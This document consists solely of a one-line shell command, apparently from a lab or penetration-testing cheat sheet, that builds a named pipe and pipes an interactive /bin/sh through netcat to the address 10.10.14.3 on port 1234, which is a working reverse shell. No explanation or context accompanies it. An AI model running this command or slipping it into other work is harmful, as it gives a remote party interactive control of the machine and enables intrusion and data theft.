rm -f f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 10.10.14.3 1234 >f 
